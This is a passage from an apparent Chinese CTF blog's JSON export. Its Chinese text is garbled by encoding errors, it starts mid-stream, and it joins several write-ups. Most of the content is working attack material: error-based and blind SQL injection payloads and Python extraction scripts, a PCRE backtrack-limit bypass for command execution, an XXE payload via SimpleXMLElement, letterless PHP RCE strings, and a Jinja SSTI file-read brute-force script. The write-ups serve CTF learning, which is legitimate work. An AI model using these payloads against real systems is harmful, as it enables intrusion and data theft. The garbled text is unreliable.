schemmaSEPARATORXORCURSORFLOORsys.schema_table_statistics_with_bufferINFILEcount%0cfrom%0d%a0=@else ç›´æ¥ç”¨åˆ«äººçš„å­—å…¸æ¥æŸ¥ä¸€ä¸‹ å¤§æ¦‚å¯¹æˆ‘ä»¬æ³¨å…¥æœ‰å½±å“çš„åªæœ‰ç©ºæ ¼ï¼Œselectçš„è¯æˆ‘ä»¬å¯ä»¥ç”¨å¤§å°å†™çš„æ–¹å¼è¿›è¡Œç»•è¿‡ï¼Œäºæ˜¯å»mysqlé‡Œé¢å°è¯•æ„é€ å‡ºè¯­å¥ï¼š 1234567mysql&gt; select * from websites where id &#x3D;1 and(select updatexml(1,concat(&#39;~&#39;,(select(database()))),1));ERROR 1105 (HY000): XPATH syntax error: &#39;~runoob&#39;mysql&gt; select * from websites where id &#x3D;1 and(select updatexml(1,concat(&#39;~&#39;,(select(database()))),1));ERROR 1105 (HY000): XPATH syntax error: &#39;~runoob&#39;mysql&gt; select * from websites where id &#x3D;1 and(select(updatexml(1,concat(&#39;~&#39;,(select(database()))),1)));ERROR 1105 (HY000): XPATH syntax error: &#39;~runoob&#39; å¾—åˆ°æ³¨å…¥è¯­å¥ï¼š 12admin&quot;^(select(updatexml(1,concat(&#x27;~&#x27;,(select(database()))),1)))##XPATH syntax error: &#x27;~web_sqli&#x27; å¾—åˆ°æ•°æ®åº“çš„åå­—. ä¸‹ä¸€æ­¥è·å–è¡¨åï¼š 1admin&quot;^(select(updatexml(1,concat(0x7e,(select(table_name)from(information_schema.tables)where(table_schema&#x3D;database()))),0x7e)))# è¿™æ ·çš„è¯ä¼šæŠ¥é”™ï¼ŒSubquery returns more than 1 rowï¼Œå› ä¸ºä¸æ­¢ä¸€ä¸ªè¡¨ï¼Œé‚£æˆ‘ä»¬æ·»åŠ group_concatå‡½æ•° åœ¨mysqlä¸­æµ‹è¯•ï¼š 12345mysql&gt; select * from student where STID&#x3D;1 and (select(updatexml(1,concat(0x7e,(select(table_name)from(information_schema.tables)where(table_schema&#x3D;database()))),0x7e)));ERROR 1242 (21000): Subquery returns more than 1 rowmysql&gt; select * from student where STID&#x3D;1 and (select(updatexml(1,concat(0x7e,(select(group_concat(table_name))from(information_schema.tables)where(table_schema&#x3D;database()))),0x7e)));ERROR 2013 (HY000): Lost connection to MySQL server during querymysql&gt; select * from student where STID&#x3D;1 and (select(updatexml(1,concat(0x7e,(select(group_concat(table_name))from(information_schema.tables)where(table_schema&#x3D;database()))),0x7e))); å¾—åˆ°è¡¨åï¼š 1XPATH syntax error: &#x27;~article,flag,users&#x27; è¿™é‡Œæå‰å‰§é€ä¸€ä¸‹ï¼Œflagè¡¨çš„ä¸œè¥¿æ˜¯å‡flagï¼Œçº¯ç²¹ä½œè€…æå¿ƒæ€çš„ï¼Œæˆ‘ä¸€ç›´è§‰å¾—è¿™ç§ä¸œè¥¿å¾ˆå¤šä½™å¥½å§ã€‚ 123mysql&gt; select * from student WHERE STID&#x3D;1 and(select updatexml(1,concat(0x7e,(select group_concat(column_name)from information_schema.columns where table_name&#x3D;&quot;student&quot;)),0x7e));ERROR 1105 (HY000): XPATH syntax error: &#39;~STID,STNAME,STSEX,STAGE,STPHONE&#39;mysql&gt; select * from student WHERE STID&#x3D;1 and(select updatexml(1,concat(0x7e,(select group_concat(column_name)from information_schema.columns where table_name&#x3D;&quot;student&quot;)),0x7e)); å¾—åˆ°å­—æ®µåï¼š 1XPATH syntax error: &#x27;~name,pwd,email,real_flag_1s_her&#x27; è¿™é‡Œå…¶å®æˆ‘ä»¬å°±å¯ä»¥å‘ç°ä¸€ä¸ªä¸æ–¹ä¾¿çš„åœ°æ–¹äº†ï¼ŒæŠ¥é”™æ³¨å…¥çš„å›æ˜¾æ˜¯æœ‰é™çš„ï¼Œæ‰€ä»¥è¿™é‡Œåé¢åº”è¯¥æ˜¯hereï¼Œå´æ²¡æœ‰æ˜¾ç¤ºå‡ºæ¥ æ³¨å…¥ï¼š 1admin&quot;^(select(updatexml(1,concat(0x7e,(select(group_concat(real_flag_1s_here))from(users))),0x7e)))# å¾—åˆ°çš„ä¸œè¥¿å¾ˆå¥‡æ€ªï¼š ~xxxx,xxx,xxxä»€ä¹ˆçš„ï¼Œè¿™å°±å¾ˆæ¶å¿ƒäººäº†ï¼Œäºæ˜¯æˆ‘ä»¬å°è¯•ç”¨æ­£åˆ™è¡¨è¾¾å¼æ¥åŒ¹é…æˆ‘ä»¬éœ€è¦çš„æ•°æ® åˆ«äººçš„è¯­å¥ï¼š 12admin&quot;||(updatexml(1,concat(0x3a,(select(group_concat(real_flag_1s_here))from(users)where(real_flag_1s_here)regexp(&#39;^f&#39;))),1))# å¾—åˆ°å‰åŠæ®µçš„flagï¼š 1XPATH syntax error: &#39;:flag&#123;8091937b-0547-42a3-b7b3-41&#39; è¿™æ ·çš„è¯è¿˜æ˜¯ä¸å¤Ÿï¼Œæˆ‘ä»¬åº”è¯¥è·å–å…¨éƒ¨çš„æ•°æ®ï¼Œäºæ˜¯ç»§ç»­æ„é€ ï¼š 12345678910111213141516ERROR 1105 (HY000): XPATH syntax error: &#39;~fuzhufuzh&#39;mysql&gt; select * from student where STID &#x3D;1 and(select(updatexml(1,concat(0x7e,(select(group_concat(STNAME))from student)),0x7e)));ERROR 1105 (HY000): XPATH syntax error: &#39;~fuzhufuzh&#39;mysql&gt; select * from student where STID &#x3D;1 and(select(updatexml(1,concat(0x7e,(select reverse((group_concat(STNAME)))from student)),0x7e)));ERROR 1105 (HY000): XPATH syntax error: &#39;~hzufuhzuf&#39;mysql&gt; select * from student where STID &#x3D;1 and(select(updatexml(1,concat(0x7e,(select(reverse((group_concat(STNAME))))from student)),0x7e)));ERROR 2013 (HY000): Lost connection to MySQL server during querymysql&gt; select * from student where STID &#x3D;1 and(select(updatexml(1,concat(0x7e,(select(reverse((group_concat(STNAME))))from student)),0x7e)));ERROR 2006 (HY000): MySQL server has gone awayNo connection. Trying to reconnect...Connection id: 11Current database: webosERROR 1105 (HY000): XPATH syntax error: &#39;~hzufuhzuf&#39;mysql&gt; select * from student where STID &#x3D;1 and(select(updatexml(1,concat(0x7e,(select(reverse((group_concat(STNAME))))from student)),0x7e))); å› ä¸ºMarkdownè‡ªåŠ¨çš„å¼±æ™ºä¸å…¨ï¼Œå¯¼è‡´æˆ‘fuzzäº†å·¨ä»–å¦ˆä¹… 12admin&quot;||(updatexml(1,concat(0x3a,(select(reverse(group_concat(real_flag_1s_here)))from(users)where(real_flag_1s_here)regexp(&#39;^f&#39;))),1))# å¾—åˆ°flagï¼š 1flag&#123;8091937b-0547-42a3-b7b3-415a267a6a46&#125; æ€»ç»“ï¼šè¿™é“é¢˜çš„ä¸éš¾ï¼Œå°±æ˜¯å‡ºé¢˜äººæ¯”è¾ƒé™©æ¶ï¼Œè®©ä½ éœ€è¦æµ‹è¯•å¾ˆä¹…ï¼Œè¿‡æ»¤çš„ä¸œè¥¿ï¼Œä¹Ÿå¾ˆå¤šï¼Œä½†æ˜¯è‡ªå·±è¿˜æ˜¯å­¦åˆ°å¾ˆå¤šä¸œè¥¿çš„ï¼Œè¿™é‡Œè®°å½•ä¸€ä¸‹regexpï¼š 1https://dev.mysql.com/doc/refman/5.7/en/regexp.html#operator_regexp å®˜æ–¹å…è®¸ç”¨æˆ·æŸ¥è¯¢çš„æ—¶å€™ä½¿ç”¨æ­£åˆ™è¡¨è¾¾å¼æ¥è¿”å›æ»¡è¶³çš„ç»“æœï¼Œè‹¥æˆ‘ä»¬å¯¹ä¸€ä¸²å­—ç¬¦ä¸²è¿›è¡ŒæŸ¥è¯¢ï¼Œè‹¥æŸ¥è¯¢æˆåŠŸï¼Œåˆ™ä¼šè¿”å›1ï¼Œå¦åˆ™å°±æ˜¯0 é™¤æ­¤ä¹‹å¤–ï¼Œè‹¥æˆ‘ä»¬æŸ¥è¯¢çš„æ˜¯ä¸€ä¸ªç»“æœé›†ï¼Œåˆ™ä¼šè¿”å›åŒ¹é…çš„ç›¸åº”æ•°æ®ï¼š æ€»ç»“ä¸‹æ¥æŸ¥è¯¢çš„ç»“æœå¦‚ä¸‹ï¼š 123select [å†…å®¹] from [è¡¨å] where [é™å®šæŸ¥è¯¢ç›®æ ‡ï¼Œåªèƒ½å»åŒ¹é…ä¸€ä¸ªå­—æ®µçš„ç›®æ ‡] REGEXP [&#39;æ­£åˆ™è¡¨è¾¾å¼&#39;];#ä¾‹å­ï¼šSELECT * from websites where url REGEXP &#39;goo&#39;; é‚£ä¹ˆæˆ‘ä»¬çš„æ³¨å…¥è¯­å¥å¯ä»¥ç¼–å†™æˆï¼š 1admin&quot;||(updatexml(1,concat(0x3a,(select(group_concat(real_flag_1s_here))from(users)where(real_flag_1s_here)regexp(&#39;^f&#39;))),1))# é™¤æ­¤ä¹‹å¤–åº”è¯¥è¿˜å¯ä»¥åˆ©ç”¨è¯¥è¯­å¥è¿›è¡Œç›²æ³¨ï¼š é¦–å…ˆæ„é€ ifè¯­å¥ï¼Œifè¯­å¥æ ¼å¼å¦‚ä¸‹ï¼š 12345678mysql&gt; SELECT IF(1&gt;2,2,3); -&gt; 3mysql&gt; SELECT IF(1&lt;2,&#39;yes&#39;,&#39;no&#39;); -&gt; &#39;yes&#39;mysql&gt; SELECT IF(STRCMP(&#39;test&#39;,&#39;test1&#39;),&#39;no&#39;,&#39;yes&#39;); -&gt; &#39;no&#39;#é‚£ä¹ˆæ ¼å¼å¦‚ä¸‹ï¼šif([åˆ¤æ–­è¡¨è¾¾å¼],[æˆåŠŸçš„ç»“æœ],[å¤±è´¥çš„ç»“æœ]); æ³¨å…¥ä¸­é€šå¸¸ä½¿ç”¨ï¼š 1234567891011121314mysql&gt; select * from websites where id &#x3D;&#39;1&#39; and if( (1&#x3D;1),0,1);Empty set (0.00 sec)mysql&gt; select * from websites where id &#x3D;&#39;1&#39; and if( (1&#x3D;1),1,0);+----+--------+------------------------+-------+---------+| id | name | url | alexa | country |+----+--------+------------------------+-------+---------+| 1 | Google | https:&#x2F;&#x2F;www.google.cm&#x2F; | 1 | USA |+----+--------+------------------------+-------+---------+1 row in set (0.00 sec)#é€»è¾‘ç¬¦å·ï¼š#&amp;&amp; ä¸º andï¼Œ^ ä¸ºxorï¼Œ||ä¸ºæˆ– æ‹¼å‡‘å‡ºæ¥å¯ä»¥å¾—åˆ°ï¼š 1and 1&#x3D;(SELECT 1 FROM information_schema.tables WHERE TABLE_SCHEMA&#x3D;&quot;security&quot; AND table_name REGEXP &#39;^e&#39; LIMIT 0,1) è¿™é‡Œé¡ºä¾¿è®°å½•ä¸€ä¸‹load_fileçš„æŠ¥é”™æ³¨å…¥ï¼š 1search.php?keywords=&#x27;and extractvalue(0x7e,concat(0x7e,(mid((select load_file(&#x27;ar/wwwml/flag.php&#x27;)),60,80))))--+ æ–‡ç« ï¼š 1https:&#x2F;&#x2F;www.freesion.com&#x2F;article&#x2F;2367234678&#x2F;","categories":[],"tags":[{"name":"BUU","slug":"BUU","permalink":"http://example.com/tags/BUU/"},{"name":"SQLæ³¨å…¥","slug":"SQLæ³¨å…¥","permalink":"http://example.com/tags/SQL%E6%B3%A8%E5%85%A5/"}]},{"title":"FBCTF2018RCEService","slug":"FBCTF2018RCEService","date":"2020-11-17T07:15:27.000Z","updated":"2020-11-17T07:51:04.195Z","comments":true,"path":"2020/11/17/FBCTF2018RCEService/","link":"","permalink":"http://example.com/2020/11/17/FBCTF2018RCEService/","excerpt":"","text":"è¦ç›²è¯•è¯•å‡ºæ¥ã€‚ã€‚ã€‚å¤§ä½¬è¯´æ˜¯æœ‰æºç ï¼š 123456789101112131415161718192021222324&lt;?phpputenv(&#x27;PATH=/home/rceservice/jail&#x27;);if (isset($_REQUEST[&#x27;cmd&#x27;])) &#123; $json = $_REQUEST[&#x27;cmd&#x27;]; if (!is_string($json)) &#123; echo &#x27;Hacking attempt detected&lt;br/&gt;&lt;br/&gt;&#x27;; &#125; elseif (preg_match(&#x27;/^.*(alias|bg|bind|break|builtin|case|cd|command|compgen|complete|continue|declare|dirs|disown|echo|enable|eval|exec|exit|export|fc|fg|getopts|hash|help|history|if|jobs|kill|let|local|logout|popd|printf|pushd|pwd|read|readonly|return|set|shift|shopt|source|suspend|test|times|trap|type|typeset|ulimit|umask|unalias|unset|until|wait|while|[\\x00-\\x1FA-Z0-9!#-\\/;-@\\[-`|~\\x7F]+).*$/&#x27;, $json)) &#123; echo &#x27;Hacking attempt detected&lt;br/&gt;&lt;br/&gt;&#x27;; &#125; else &#123; echo &#x27;Attempting to run command:&lt;br/&gt;&#x27;; $cmd = json_decode($json, true)[&#x27;cmd&#x27;]; if ($cmd !== NULL) &#123; system($cmd); &#125; else &#123; echo &#x27;Invalid input&#x27;; &#125; echo &#x27;&lt;br/&gt;&lt;br/&gt;&#x27;; &#125;&#125;?&gt; è¿™é“é¢˜æ³¨æ„è¿™é‡Œï¼š 1putenv(&#x27;PATH=/home/rceservice/jail&#x27;); æ‰€ä»¥æˆ‘ä»¬æƒ³è¦æ‰§è¡Œå‘½ä»¤çš„è¯å¿…é¡»é€šè¿‡/bin/catæ¥æ‰§è¡Œç³»ç»Ÿå‘½ä»¤ï¼ˆæœ¬äººä¸æ˜¯å¾ˆèƒ½æ˜ç™½åŸå› ã€‚ã€‚ï¼‰ æ­£åˆ™ç»•è¿‡ï¼Œè¿™é‡Œå¯ä»¥é€šè¿‡Pç‰›å¤§ä½¬çš„æ–‡ç« ï¼š 1https:&#x2F;&#x2F;www.leavesongs.com&#x2F;PENETRATION&#x2F;use-pcre-backtrack-limit-to-bypass-restrict.html é˜…è¯»Pç‰›å¤§ä½¬çš„æ–‡ç« ï¼Œå¤§è‡´æ„æ€æ˜¯ï¼ŒPHPçš„æ­£åˆ™å¹¶ä¸æ˜¯é€šè¿‡æ ¹æ®æ­£åˆ™çš„åŒ¹é…æ¥å†³å®šä¸‹ä¸€æ­¥çš„ï¼Œå¦‚æœæ»¡è¶³æ¡ä»¶çš„è¯ï¼Œæ­£åˆ™ä¾¿ä¼šæ— é™çš„å‘ååŒ¹é…ï¼Œç›´åˆ°æœ«å°¾ä¹‹åï¼Œå¦‚æœæ­£åˆ™æ²¡æœ‰èƒ½å¤ŸæˆåŠŸåŒ¹é…ç»“å°¾ï¼Œå°±ä¼šå¾€å›å›æº¯ï¼Œæ¥æŸ¥æ‰¾åˆ°æ»¡è¶³æ¡ä»¶çš„æƒ…å†µ ç±»ä¼¼Pç‰›å¤§ä½¬çš„ä¾‹å­ï¼Œå¦‚æœæŒ‰ç…§æˆ‘ä»¬çš„æ€è·¯çš„è¯ï¼Œå½“åŒ¹é…åˆ° ;çš„æ—¶å€™ï¼Œå·²ç»åŒ¹é…æˆåŠŸï¼Œæ‰€ä»¥å°±åº”è¯¥åœä¸‹æ¥äº†ï¼Œä½†æ˜¯ç”±äº.*å¯ä»¥åŒ¹é…ä»»æ„ï¼Œæ•…æˆ‘ä»¬ä¼šä¸€ç›´åŒ¹é…åˆ°æœ€åä¸€æ­¥ï¼Œä½†æ­¤æ—¶æ­£åˆ™æ²¡æœ‰åŒ¹é…æˆåŠŸï¼Œå°±ä¼šå¾€å‰æ¨ï¼Œç›´åˆ°æ­£åˆ™åŒ¹é…æˆåŠŸã€‚ åˆå› ä¸ºPç‰›å¸ˆå‚…è¯´çš„ï¼Œåªè¦å›æº¯100000æ­¤å°±ä¼šå¤±è´¥ï¼Œæ‰€ä»¥æˆ‘ä»¬å‘é€ä¸€ä¸²è¶…çº§é•¿çš„å­—ç¬¦ä¸²å³å¯ 123456789import requestsparams = &#x27;&#123;&quot;cmd&quot;:&quot;/bin/cat /home/rceservice/flag&quot;,&quot;123&quot;:&quot;&#x27; + &quot;a&quot;*(1000000) + &#x27;&quot;&#125;&#x27;params = &#123;&quot;cmd&quot;:params&#125;url = &quot;http://e23f7266-20a3-4aa0-bfbc-8a9502764002.node3.buuoj.cn&quot;res = requests.post(url=url,data=params).textprint(res) æ³¨æ„è¿™é‡Œä¸€å®šè¦å‘é€poståŒ…ï¼ŒgetåŒ…æ— æ³•æ¥å—è¿™ä¹ˆé•¿çš„å‚æ•°ï¼Œä¼ è¿‡å»å°±å¯ä»¥å¾—åˆ°flagäº†","categories":[],"tags":[{"name":"BUU","slug":"BUU","permalink":"http://example.com/tags/BUU/"},{"name":"php","slug":"php","permalink":"http://example.com/tags/php/"}]},{"title":"PHPçš„ä¸€ä¸ªå†…ç½®ç±»","slug":"PHPçš„ä¸€ä¸ªå†…ç½®ç±»","date":"2020-11-16T13:41:28.000Z","updated":"2020-12-20T13:49:15.069Z","comments":true,"path":"2020/11/16/PHPçš„ä¸€ä¸ªå†…ç½®ç±»/","link":"","permalink":"http://example.com/2020/11/16/PHP%E7%9A%84%E4%B8%80%E4%B8%AA%E5%86%85%E7%BD%AE%E7%B1%BB/","excerpt":"","text":"æŸåº—é‡Œæ¯”èµ›é¢˜ç›®ï¼š 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119&lt;?phpclass User&#123; private static $c = 0; public function __construct($ra,$rb) &#123;// $c = $ra;// $c = $rb; &#125; function a() &#123; return ++self::$c; &#125; function b() &#123; return ++self::$c; &#125; function c() &#123; return ++self::$c; &#125; function d() &#123; return ++self::$c; &#125; function e() &#123; return ++self::$c; &#125; function f() &#123; return ++self::$c; &#125; function g() &#123; return ++self::$c; &#125; function h() &#123; return ++self::$c; &#125; function i() &#123; return ++self::$c; &#125; function j() &#123; return ++self::$c; &#125; function k() &#123; return ++self::$c; &#125; function l() &#123; return ++self::$c; &#125; function m() &#123; return ++self::$c; &#125; function n() &#123; return ++self::$c; &#125; function o() &#123; return ++self::$c; &#125; function p() &#123; return ++self::$c; &#125; function q() &#123; return ++self::$c; &#125; function r() &#123; return ++self::$c; &#125; function s() &#123; return ++self::$c; &#125; function t() &#123; return ++self::$c; &#125;&#125;$rc=$_GET[&quot;rc&quot;];$rb=$_GET[&quot;rb&quot;];$ra=$_GET[&quot;ra&quot;];$rd=$_GET[&quot;rd&quot;];$method= new $rc($ra, $rb);var_dump($method-&gt;$rd()); æˆ‘ä»¬å¯ä»¥æ§åˆ¶å››ä¸ªå‚æ•°ï¼Œä½†æ˜¯æˆ‘ä»¬æ˜æ˜¾çŸ¥é“ï¼Œè¿™é‡Œçš„Userç±»å®Œå…¨æ²¡æœ‰æ„ä¹‰ï¼Œé¢˜ç›®ç»™å‡ºæç¤ºè®©æˆ‘ä»¬æƒ³æƒ³è¿˜æœ‰ä»€ä¹ˆç±»ï¼Œæƒ³äº†åŠå¤©åº”è¯¥æ˜¯å†…ç½®ç±»ï¼Œé˜Ÿé‡Œçš„w4nderå¸ˆå‚…ç›´æ¥ç»™æˆ‘expäº†ï¼ŒWTMç›´æ¥å¼€èˆ” 1?rc&#x3D;SimpleXMLElement&amp;ra&#x3D;&lt;?xml version&#x3D;&quot;1.0&quot;?&gt;&lt;!DOCTYPE ANY [&lt;!ENTITY xxe SYSTEM &quot;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;.&#x2F;index.php&quot;&gt;]&gt;&lt;x&gt;&amp;xxe;&lt;&#x2F;x&gt;&amp;rb&#x3D;2&amp;rd&#x3D;__toString æ— å­—æ¯RCEï¼š 12$_&#x3D;&quot;&#96;&#123;&#123;&#123;&quot;^&quot;?&lt;&gt;&#x2F;&quot;;$&#123;$_&#125;[_]($&#123;$_&#125;[__]); &#x2F;&#x2F;$_GET[_]($_GET[__])http:&#x2F;&#x2F;69.90.132.196:5003&#x2F;?warmup&#x3D;$_&#x3D;&quot;&#96;&#123;&#123;&#123;&quot;^&quot;?&lt;&gt;&#x2F;&quot;;$&#123;$_&#125;[_]($&#123;$_&#125;[__]);&amp;_&#x3D;readfile&amp;__&#x3D;flag.php å¦å¤–è¿˜çœ‹åˆ°äº†ä¸€ç§è¯»æ–‡ä»¶çš„ payloadï¼Œæ”¶è—äº† 123$_=&quot;@:&gt;;963:&quot;^&quot;2_______&quot;; // readfile$__=&quot;____&quot;^&quot;830=&quot;; // glob$_($__(&#x27;*&#x27;)[0]); // readfile(glob(&#x27;*&#x27;))","categories":[],"tags":[]},{"title":"2020ä¸Šæµ·å¸‚ç½‘ç»œå®‰å…¨å¤§èµ›","slug":"2020ä¸Šæµ·å¸‚ç½‘ç»œå®‰å…¨å¤§èµ›","date":"2020-11-14T08:34:25.000Z","updated":"2020-11-17T06:03:38.282Z","comments":true,"path":"2020/11/14/2020ä¸Šæµ·å¸‚ç½‘ç»œå®‰å…¨å¤§èµ›/","link":"","permalink":"http://example.com/2020/11/14/2020%E4%B8%8A%E6%B5%B7%E5%B8%82%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%A4%A7%E8%B5%9B/","excerpt":"","text":"æ³¨å…¥æ¯ï¼Œæ„Ÿè§‰ä¹Ÿæ˜¯è‡ªé—­çš„ä¸€å¤©orz,åƒåœ¾æ–‡ç« ï¼Œåªä¸è¿‡æ˜¯è®°å½•ä¸€ä¸‹è„šæœ¬ åƒæ¯’ç½‘ç›˜ 1https:&#x2F;&#x2F;blog.csdn.net&#x2F;weixin_30258901&#x2F;article&#x2F;details&#x2F;96605162 åœ¨è¿™ä¸ªğŸ”—ä¸‹æˆ‘ä»¬å¯ä»¥æ‰¾åˆ°çš„ï¼åˆ©ç”¨æ¯”è¾ƒç®€å•ï¼Œå¦‚æœæˆ‘ä»¬éœ€è¦çš„å‚æ•°åœ¨getä¸Šï¼Œå¯ä»¥æ„é€ å¦‚ä¸‹ï¼š 123?code = xx_GET[code] =xxåªéœ€è¦ä¸¤è€…ä¿æŒä¸€è‡´å³å¯ å¦‚æœåœ¨POSTä¸Šï¼Œåˆ™åè¿‡æ¥ï¼š 12?_POST[code] =xxcode =xx ç”±äº$$key_2 == $value_2ä½¿å¾—POSTçš„å€¼è¢«unsetäº†ï¼Œç»•è¿‡wafï¼Œåé¢å†æ¬¡extracté€ æˆå˜é‡è¦†ç›– ç„¶åæ˜¯å¸ƒå°”ç›²æ³¨ï¼Œè¿™é‡Œç”¨â€“+ä»£æ›¿#ï¼Œä¸ç„¶ä¼šå‡ºç°é”™è¯¯æƒ…å†µ é˜Ÿé‡Œå¸ˆå‚…çš„è„šæœ¬ï¼š 12345678910111213141516171819202122232425262728293031323334import requestsimport stringurl=&quot;http://eci-2zehpt4jc1z3f9vgcraf.cloudeci1.ichunqiu.com/index.php&quot;text=&#x27;&#x27;proxies=&#123;&#x27;http&#x27;:&#x27;127.0.0.1:8080&#x27;,&#x27;https&#x27;:&#x27;127.0.0.1:8080&#x27;&#125;headers = &#123; &quot;Content-Type&quot;:&quot;application/x-www-form-urlencoded&quot;&#125;for i in range(1,200): l=28 h=126 while abs(h - l) &gt; 1: m=(l+h)/2 pay=&quot;select flag from flag&quot; #pay=&quot;database()&quot; e = &quot;(ascii(mid((&#123;&#125;),&#123;&#125;,1)))&gt;&#123;&#125;&quot;.format(pay, i, m) data = &quot;code=114514&#x27;and if((&#123;&#125;),1,0)--+&quot;.format(e) #print(data) #print(url+&quot;?_POST[code]=&quot;+data[&#x27;code&#x27;]) re=requests.post(url+&quot;?_POST[code]=&quot;+data.strip(&#x27;code=&#x27;),data=data,headers=headers) #print(re.text) #print(data) #exit() if &#x27;http://gamectf.com/p/CGBU.png&#x27; in re.text: l=m else: h=m mid_num = int((l + h + 1) / 2) text += chr(int(h)) print(text) TryToLoginè¿™é“é¢˜ç›®æ˜¯æ ¼å¼åŒ–å­—ç¬¦ä¸²æ³¨å…¥ï¼Œæ„Ÿè§‰æœ‰å¿…è¦å­¦ä¹ ä¸€ä¸‹,sprintf 12345678910111213141516171819202122232425262728import requestsimport stringurl&#x3D;&quot;http:&#x2F;&#x2F;eci-2ze4elsbeer15p6dsvx2.cloudeci1.ichunqiu.com&#x2F;index.php&quot;text&#x3D;&#39;&#39;proxies&#x3D;&#123;&#39;http&#39;:&#39;127.0.0.1:8080&#39;,&#39;https&#39;:&#39;127.0.0.1:8080&#39;&#125;headers &#x3D; &#123; &quot;Content-Type&quot;:&quot;application&#x2F;x-www-form-urlencoded&quot;&#125;for i in range(1,200): l&#x3D;28 h&#x3D;126 while abs(h - l) &gt; 1: m&#x3D;(l+h)&#x2F;2 pay&#x3D;&quot;select group_concat(table_name) from sys.schema_table_statistics_with_buffer where table_schema&#x3D;database()&quot; pay&#x3D;&quot;select * from fl4g&quot; e &#x3D; &quot;(ascii(mid((&#123;&#125;),&#123;&#125;,1)))&gt;&#123;&#125;&quot;.format(pay, i, m) data &#x3D;&quot;password&#x3D;%1$&#39;||if((&#123;&#125;),1,0)--+&quot;.format(e)+&#39;&amp;username&#x3D;admin&#39; re&#x3D;requests.post(url,data&#x3D;data,headers&#x3D;headers) if &#39;ç™»å½•æˆåŠŸäº†&#39; in re.text: l&#x3D;m else: h&#x3D;m text +&#x3D; chr(int(h)) print(text) SSTI123456789101112131415161718192021222324252627282930313233343536373839from flask import Flask,request,render_templatefrom jinja2 import Templateimport osapp = Flask(__name__)f = open(&#x27;/flag&#x27;,&#x27;r&#x27;)flag = f.read()@app.route(&#x27;/&#x27;,methods=[&#x27;GET&#x27;,&#x27;POST&#x27;])def home(): name = request.args.get(&quot;name&quot;) or &quot;&quot; print(name) if name: return render_template(&#x27;index.html&#x27;,name=name) else: return render_template(&#x27;index.html&#x27;)@app.route(&#x27;/help&#x27;,methods=[&#x27;GET&#x27;])def help(): help = &#x27;&#x27;&#x27; &#x27;&#x27;&#x27; return f.read()@app.errorhandler(404)def page_not_found(e): #No way to get flag! os.system(&#x27;rm -f /flag&#x27;) url = name = request.args.get(&quot;name&quot;) or &quot;&quot; r = request.path r = request.data.decode(&#x27;utf8&#x27;) if &#x27;eval&#x27; in r or &#x27;popen&#x27; in r or &#x27;&#123;&#123;&#x27; in r: t = Template(&quot; Not found!&quot;) return render_template(t), 404 t = Template(r + &quot; Not found!&quot;) return render_template(t), 404if __name__ == &#x27;__main__&#x27;: app.run(host=&#x27;0.0.0.0&#x27;,port=8888) è¿™é“é¢˜æ¯”è¾ƒæ–°æœ‰æ„æ€çš„ç‚¹åœ¨ä¸¤ä¸ªåœ°æ–¹ï¼š è¿‡æ»¤äº†è¿™ä¸ªåœ°æ–¹ 1if &#x27;eval&#x27; in r or &#x27;popen&#x27; in r or &#x27;&#123;&#123;&#x27; in r: è¿‡æ»¤äº†å·¦å³èŠ±æ‹¬å·,è¿™æ ·å­çš„æƒ…å†µä»¥å‰è‡ªå·±æ²¡æœ‰é‡è¿‡ï¼Œåæ¥çŸ¥é“å¯ä»¥è¿›è¡Œç›²æ³¨ï¼Œå¹¶ä¸”æˆ‘ä»¬å¯ä»¥å°è¯•è¯»å–æ–‡ä»¶ï¼Œè¯»å–æ–‡ä»¶çš„payloadå¦‚ä¸‹ï¼š 1&#123;% if self.__dict__._TemplateReference__context.lipsum.__globals__.__builtins__.open(&quot;your file name &quot;).read()[1:2] &#x3D;&#x3D; &quot;a&quot; %&#125;~p0~&#123;% endif %&#125; å¦‚æœæ»¡è¶³æ¡ä»¶ï¼Œåˆ™ä¼šè¾“å‡ºp0ï¼Œå¦åˆ™å°±ä¸ä¼šè¾“å‡ºã€‚ç¬¬äºŒç‚¹ï¼Œæˆ‘ä»¬è¯¥è¯»å–ä»€ä¹ˆæ–‡ä»¶å‘¢ï¼Ÿ è¿™é‡Œè¿ç”¨äº†os.system(â€œrm -f /flagâ€) é»˜è®¤çš„è¿›ç¨‹åˆ é™¤åä¼šå­˜æ”¾åœ¨æš‚æ—¶æ–‡ä»¶ä¸­ï¼Œè¿›ç¨‹ä¸ºï¼š 1/proc/self/fd/3 æ•…ç¼–å†™è„šæœ¬å¦‚ä¸‹ï¼š 12345678910111213141516171819202122import requestsimport stringurl = &#x27;http://eci-2ze006f3h1dkgrldoskz.cloudeci1.ichunqiu.com:8888/a&#x27;headers=&#123; &#x27;Content-Type&#x27;:&#x27;application/json&#x27;&#125;def check(payload): r = requests.post(url, data=payload,headers=headers).text return &#x27;~p0~&#x27; in rpassword = &#x27;&#x27;sa=string.printable#print(s)for i in range(0,100): for c in sa: payload=&#x27;&#123;% if self.__dict__._TemplateReference__context.lipsum.__globals__.__builtins__.open(&quot;/proc/self/fd/3&quot;).read()[&#x27; + str(i) + &#x27;:&#x27; + str( i + 1) + &#x27;] == &quot;&#x27; + c + &#x27;&quot; %&#125;~p0~&#123;% endif %&#125;&#x27; # print(payload) if check(payload): password += c break print(password)","categories":[],"tags":[]},{"title":"Springå­¦ä¹ ","slug":"Springå­¦ä¹ ","date":"2020-11-10T13:58:01.000Z","updated":"2020-11-17T06:09:39.491Z","comments":true,"path":"2020/11/10/Springå­¦ä¹ /","link":"","permalink":"http://example.com/2020/11/10/Spring%E5%AD%A6%E4%B9%A0/","excerpt":"","text":"Springä»ä»Šå¤©å¼€å§‹å­¦Sping1.IOCç†è®ºæ¨å¯¼ï¼š UserDaoæ¥å£ UserDaomplå®ç°ç±» Userserviceä¸šåŠ¡æ¥å£ UserServiceimpl ä¸šåŠ¡å®ç°ç±» åœ¨ä¹‹å‰çš„ä¸šåŠ¡å½“ä¸­ï¼Œç”¨æˆ·çš„éœ€æ±‚ä¼šä¿®æ”¹æˆ‘ä»¬çš„ä»£ç ï¼Œå¯¼è‡´ä»£ç éš¾ä»¥ç»´æŠ¤ï¼Œæ‰€ä»¥æˆ‘ä»¬å¼€å§‹ä½¿ç”¨äº†setå€¼æ¤å…¥ï¼Œsetæ¥å£ï¼Œå®ç°ä¸ç”¨ä¿®æ”¹ä»£ç 